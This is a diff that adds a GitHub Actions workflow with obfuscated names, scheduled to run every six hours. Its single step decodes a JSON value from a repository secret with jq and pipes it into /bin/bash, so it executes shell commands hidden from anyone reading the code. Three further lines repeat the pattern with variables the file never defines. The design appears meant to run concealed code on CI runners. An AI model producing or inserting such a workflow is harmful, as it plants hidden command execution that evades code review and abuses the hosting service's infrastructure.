@@ -1,0 +1,21 @@
+name: dnbshul
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dnbshul
+        env:
+          fwula2497: ${{ secrets.fwula2497 }}
+        run: |
+          echo $fwula2497 | jq -r .ab16163 | /bin/bash
+          echo $bvil6 | jq -r .c2 | /bin/bash
+          echo $p17389 | jq -r .vxc82 | /bin/bash
+          echo $ntet6 | jq -r .bgwt59915 | /bin/bash
+
